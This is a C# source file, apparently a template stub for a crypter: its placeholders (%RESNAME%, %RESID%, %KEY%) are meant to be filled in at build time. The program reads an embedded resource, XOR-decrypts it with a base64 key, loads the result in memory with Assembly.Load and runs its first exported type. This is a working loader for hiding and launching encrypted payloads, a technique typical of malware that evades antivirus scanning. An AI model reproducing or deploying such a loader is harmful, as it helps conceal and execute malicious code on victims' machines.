using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Windows.Forms;

/*ASM_INFO*/

namespace Loader
{
  
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {

            byte[] dll = (byte[])GetResource("%RESNAME%", "%RESID%");

            byte[] key = Convert.FromBase64String("%KEY%");

            for(int i = 0; i < dll.Length; i++)
            {
                dll[i] = (byte)(dll[i] ^ key[i % key.Length]);
            }

            Activator.CreateInstance(Assembly.Load(dll).GetExportedTypes()[0],typeof(Program));
            //Assembly.Load()
        }

        private static object GetResource(string name, string key)
        {
            Assembly asm = Assembly.GetExecutingAssembly();

            using (Stream s = asm.GetManifestResourceStream(name))
            {
                using (ResourceReader rr = new ResourceReader(s))
                {
                    IDictionaryEnumerator en = rr.GetEnumerator();

                    while (en.MoveNext())
                    {
                        if (en.Key is string && (string)en.Key == key)
                        {
                            return en.Value;
                        }
                    }

                }
            }
            throw new Exception();
        }

    }
}
